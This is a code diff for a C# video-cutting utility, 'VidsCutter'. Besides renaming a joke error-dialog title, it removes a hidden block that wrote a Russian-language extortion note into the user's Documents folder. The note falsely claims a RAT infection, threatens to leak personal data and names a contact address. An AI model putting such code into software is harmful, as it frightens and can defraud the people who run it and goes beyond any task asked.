@@ -150,7 +150,7 @@ namespace VidsCutter
                 }
                 catch (Exception ex)
                 {
-                    MessageBox.Show("Ошибка при обрезке видео: " + ex.Message, "Технический прикол", MessageBoxButton.OK, MessageBoxImage.Error,MessageBoxResult.None);
+                    MessageBox.Show("Ошибка при обрезке видео: " + ex.Message, "Технические неполадки", MessageBoxButton.OK, MessageBoxImage.Error,MessageBoxResult.None);
                 }
             });
         }
@@ -172,16 +172,6 @@ namespace VidsCutter
                 CutButton.IsEnabled = false; // Делаем кнопку неактивной
                 DnDZone.IsEnabled = false;
 
-                // Проверка наличия файла "MESSAGE.txt"
-                string documentsPath = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
-                string messageFilePath = Path.Combine(documentsPath, "Послание.txt");
-
-                if (!File.Exists(messageFilePath))
-                {
-                    // Файл "MESSAGE.txt" отсутствует
-                    // Создать файл "MESSAGE.txt" в папке "Мои документы"
-                    File.WriteAllText(messageFilePath, "Уважаемый пользователь. \n\nВаш компьютер был подвергнут атаке. Мы хотим проинформировать вас о заражении вашей системы RAT вирусом. Заражение произошло после установки пиратской копии игры (16.02.2023), установленной вами. Это результат вашего невнимания к собственной безопасности.\n\nНа данный момент мы имеем полный контроль над вашим компьютером и всеми важными данными, хранящимися на нем. Ваша онлайн-активность, личные файлы, переписка и финансовая информация - все это под нашим контролем.\n\nМы предлагаем вам два варианта действий. Во-первых, вы можете сотрудничать с нами, выполнять наши требования и освободить свою систему от вирусов. Во-вторых, если вы решите игнорировать наше предложение или обратиться к правоохранительным органам, мы раскроем вашу личную информацию и скомпрометируем вашу репутацию.\n\nДля продолжения общения и получения инструкций, пожалуйста, свяжитесь с нами по адресу adolfhitler@mail.ru с темой <Ключ к свободе>. Время работает против вас, поэтому не теряйте его зря.\n\nС уважением, $an4eLLo");
-                }
                 if (CheckBoxBtn.IsChecked == true)
                 {
                     var confirmDelete = MessageBox.Show("Файлы будут удалены без возможности восстановления.","Внимание!",MessageBoxButton.OKCancel,MessageBoxImage.Warning);
